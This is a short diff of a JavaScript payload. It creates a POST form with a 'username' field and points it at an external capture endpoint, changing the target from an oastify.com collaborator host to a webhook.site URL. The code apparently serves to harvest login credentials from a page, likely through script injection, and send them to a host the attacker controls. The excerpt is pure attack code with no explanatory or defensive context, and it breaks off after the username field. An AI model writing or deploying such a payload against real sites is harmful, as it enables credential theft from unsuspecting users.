@@ -1,6 +1,6 @@
 var form = document.createElement('form');
 form.method = 'POST';
-form.action = 'https://ds9tfz17pzciyo2438iqrxxqthz8nybn.oastify.com/roba';
+form.action = 'https://webhook.site/1824d499-3c06-4692-9386-beb02eb8632b';
 
 var inputUser = document.createElement('input');
 inputUser.name = 'username';
